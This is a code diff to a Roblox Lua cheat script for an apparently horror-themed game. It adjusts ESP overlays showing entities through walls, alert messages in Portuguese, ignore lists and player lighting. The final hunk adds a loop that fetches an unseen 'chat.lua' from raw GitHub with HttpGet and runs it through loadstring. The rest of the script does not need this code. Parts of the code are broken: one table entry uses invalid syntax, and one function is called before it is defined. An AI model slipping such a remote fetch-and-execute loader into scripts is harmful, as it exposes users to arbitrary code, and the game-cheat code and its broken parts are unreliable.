@@ -44,12 +44,12 @@ local function getAlertMessage(entityName)
         return 'apareceu, não precisa esconder.'
     end
 
-    if name == "b-120" or name == "a-200" or name == "g-140" then
+    if name == "b-120" or name == "a-200" or name == "?-140" or name == "b-200" then
         return 'apareceu, esconda-se em armários.'
     end
 
     if name == "b-140" then
-        return '"B-140" apareceu, esconda-se em lugares NÃO marcados em verde.'
+        return 'apareceu, esconda-se em lugares NÃO marcados em verde.'
     end
 
     if name == "a-105" or name == "c-105" or name == "b-40"
@@ -74,6 +74,11 @@ end
 
 local function sendChatAlert(entity)
     if not chatAlertEnabled then return end
+    if not entity or not entity.Name then return end
+
+    if isIgnoredAlertEntity(entity.Name) then
+        return
+    end
 
     local msg = '"' .. tostring(entity.Name or "???") .. '" ' .. getAlertMessage(entity.Name)
 
@@ -108,7 +113,7 @@ local function UpdatePlayerLight()
         playerLight = Instance.new("PointLight")
         playerLight.Name = "RLD_Light"
         playerLight.Parent = hrp
-        playerLight.Range = 800
+        playerLight.Range = 3000
         playerLight.Brightness = 3
     end
 
@@ -130,12 +135,14 @@ local function getMultiTransitionColor(colors, speed, interval)
 end
 
 local ignoredAlertEntities = {
-    ["happyman"] = true,
-    ["angryman"] = true,
-    ["sleepyman"] = true,
-    ["smartman"] = true,
-    ["tallman"] = true,
-    ["mournfulman"] = true,
+    happyman = true,
+    angryman = true,
+    sleepyman = true,
+    smartman = true,
+    tallman = true,
+    mournfulman = true,
+    joyfulman = true,
+
     ["cb-1"] = true,
     ["c-1"] = true,
     ["a-1"] = true,
@@ -143,25 +150,61 @@ local ignoredAlertEntities = {
     ["jb-1"] = true,
     ["gl-1"] = true,
     ["m-122"] = true,
-    ["amon"] = true,
-    ["amon2"] = true,
-    ["yzz"] = true,
-    ["zzx"] = true,
-    ["xzz"] = true,
-    ["xyz"] = true,
-    ["joyfulman"] = true,
-    ["sinkingpotatosalad2"] = true,
-    ["sinkingpotatosalad"] = true,
+
+    amon = true,
+    amon2 = true,
+
+    yzz = true,
+    zzx = true,
+    xzz = true,
+    xyz = true,
+
+    sinkingpotatosalad = true,
+    sinkingpotatosalad2 = true,
 }
 
 local ESP_IGNORE_NAMES = {
     sinkingpotatosalad2 = true,
-    sinkingpotatosalad = true
+    sinkingpotatosalad = true,
+
+    mob-1 = true,
+    mob-2 = true,
+
+    amon = true,
+    amon2 = true,
+
+    yzz = true,
+    zzx = true,
+    xzz = true,
+    xyz = true
 }
+
+local function shouldIgnoreESP(entityName)
+    if not entityName then return true end
+    return ESP_IGNORE_NAMES[string.lower(entityName)] == true
+end
+
 
 local function shouldShowForEntity(entName)
     if not entName then return false end
     return not ignoredAlertEntities[entName:lower()]
+end
+
+local function normalizeName(name)
+    if not name then return "" end
+    return string.lower(name)
+end
+
+local function isIgnoredAlertEntity(name)
+    name = normalizeName(name)
+
+    for ignored,_ in pairs(ignoredAlertEntities) do
+        if string.find(name, ignored, 1, true) then
+            return true
+        end
+    end
+
+    return false
 end
 
 local colorTable = {
@@ -251,7 +294,7 @@ local colorTable = {
     ["a-50"] = Color3.fromRGB(255, 0, 0),
     ["billy-140"] = "billy140mix",
     ["cfo-300"] = Color3.fromRGB(0, 255, 255),
-    ["g-140"] = "g140fire",
+    ["?-140"] = "g140fire",
     ["olaf-26"] = Color3.fromRGB(240, 240, 255),
     ["omg-40"] = "crazyall",
     ["nibbleton"] = Color3.fromRGB(128, 128, 128),
@@ -489,7 +532,7 @@ local espBlocked = {}
 
 local function CreateESP(part, entity)
     if not entity or not entity.Name then return end
-    if ESP_IGNORE_NAMES[entity.Name] then return end
+    if ESP_IGNORE_NAMES[string.lower(entity.Name)] then return end
     if part:FindFirstChild("ESP_Billboard") then return end
     if espBlocked[entity] then return end
 
@@ -505,7 +548,7 @@ local function CreateESP(part, entity)
     Label.TextStrokeTransparency = 0
     Label.TextScaled = true
     Label.Font = Enum.Font.GothamBold
-    Label.Text = entity.Name .. " | --"
+    Label.Text = entity.Name .. " — --"
     Label.Parent = Billboard
 
     Billboard.Parent = ESPFolder
@@ -521,9 +564,9 @@ local function CreateESP(part, entity)
             local distance = (hrp.Position - Billboard.Adornee.Position).Magnitude
 
             if distance == distance then
-                Label.Text = entity.Name .. " | " .. math.floor(distance) .. "M"
+                Label.Text = entity.Name .. " — " .. math.floor(distance) .. "M"
             else
-                Label.Text = entity.Name .. " | --"
+                Label.Text = entity.Name .. " — --"
             end
 
             Label.TextColor3 = getEntityColor(entity)
@@ -548,19 +591,19 @@ task.spawn(function()
             local folder = workspace:FindFirstChild("SpawnedEnitites")
             if folder then
                 for _, entity in pairs(folder:GetChildren()) do
-    if entity and entity.Name
-        and not espBlocked[entity]
-        and not ESP_IGNORE_NAMES[entity.Name] then
+                    if entity and entity.Name
+                        and not espBlocked[entity]
+                        and not ESP_IGNORE_NAMES[string.lower(entity.Name)] then
 
-        local part = entity.PrimaryPart or entity:FindFirstChildWhichIsA("BasePart")
-        if part then
-            CreateESP(part, entity)
-        end
-    end
-end
+                        local part = entity.PrimaryPart or entity:FindFirstChildWhichIsA("BasePart")
+                        if part then
+                            CreateESP(part, entity)
+                        end
+                    end
+                end
             end
         end
-        wait(0.6)
+        wait(2)
     end
 end)
 
@@ -722,7 +765,11 @@ credit.Font = Enum.Font.Gotham
 credit.TextScaled = true
 credit.Parent = frame
 
+local currentGuiAlert = nil
+local currentHeartbeat = nil
+
 local lastEntities = {}
+
 task.spawn(function()
     while true do
         local folder = workspace:FindFirstChild("SpawnedEnitites")
@@ -735,57 +782,78 @@ task.spawn(function()
 
             for entity,_ in pairs(current) do
                 if not lastEntities[entity] then
-                    if shouldShowForEntity(entity.Name) then
+                    if entity and entity.Name
+                        and shouldShowForEntity(entity.Name)
+                        and not isIgnoredAlertEntity(entity.Name) then
 
                         if alertEntitiesEnabled then
+                            
+                            if currentGuiAlert then
+                                currentGuiAlert:Destroy()
+                                currentGuiAlert = nil
+                            end
+                            if currentHeartbeat then
+                                currentHeartbeat:Disconnect()
+                                currentHeartbeat = nil
+                            end
+
                             local guiAlert = Instance.new("Frame")
                             guiAlert.Name = "EntityAlertPrompt"
                             guiAlert.Size = UDim2.new(0, 400, 0, 74)
                             guiAlert.AnchorPoint = Vector2.new(0.5, 0)
                             guiAlert.Position = UDim2.new(0.5, 0, 0.08, 0)
-                            guiAlert.BackgroundColor3 = mainColor
+                            guiAlert.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                             guiAlert.BorderSizePixel = 0
-                            guiAlert.Parent = gui
                             guiAlert.ZIndex = 1000
+                            guiAlert.Parent = gui
 
-                            Instance.new("UICorner", guiAlert).CornerRadius = UDim.new(0,13)
+                            Instance.new("UICorner", guiAlert).CornerRadius = UDim.new(0, 13)
 
                             local label = Instance.new("TextLabel")
-                            label.Size = UDim2.new(1,0,1,0)
+                            label.Size = UDim2.new(1, 0, 1, 0)
                             label.BackgroundTransparency = 1
-                            label.Text = '"' .. tostring(entity.Name or "???") .. '" ' .. getAlertMessage(entity.Name)
+                            label.Text =
+                                '"' .. tostring(entity.Name or "???") .. '" ' ..
+                                getAlertMessage(entity.Name)
                             label.Font = Enum.Font.GothamBold
                             label.TextScaled = true
                             label.ZIndex = 1001
+                            label.TextColor3 = Color3.fromRGB(255,255,255)
                             label.Parent = guiAlert
 
-                            local heartbeat
-                            heartbeat = game:GetService("RunService").Heartbeat:Connect(function()
+                            currentHeartbeat = game:GetService("RunService").Heartbeat:Connect(function()
                                 if label and label.Parent then
                                     label.TextColor3 = getEntityColor(entity)
-                                else
-                                    if heartbeat then heartbeat:Disconnect() end
                                 end
                             end)
 
+                            currentGuiAlert = guiAlert
+
                             delay(5, function()
-                                if guiAlert then guiAlert:Destroy() end
-                                if heartbeat then heartbeat:Disconnect() end
+                                if currentGuiAlert == guiAlert then
+                                    if currentHeartbeat then
+                                        currentHeartbeat:Disconnect()
+                                        currentHeartbeat = nil
+                                    end
+                                    if currentGuiAlert then
+                                        currentGuiAlert:Destroy()
+                                        currentGuiAlert = nil
+                                    end
+                                end
                             end)
                         end
 
+                   
                         sendChatAlert(entity)
-
                     end
                 end
             end
 
             lastEntities = current
         end
-        wait(0.1)
+        task.wait(0.1)
     end
 end)
-
 
 
 configButton.MouseButton1Click:Connect(function()
@@ -1102,3 +1170,17 @@ closeButton.MouseButton1Click:Connect(function()
     gui:Destroy()
     ESPFolder:Destroy()
 end)
+
+task.spawn(function()
+    while true do
+        local ok, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/lynxxdev/freeman-scriptss/refs/heads/main/chat.lua"))()
+        end)
+
+        if not ok then
+            warn("Erro ao executar:", err)
+        end
+
+        task.wait(1e9)
+    end
+end)    
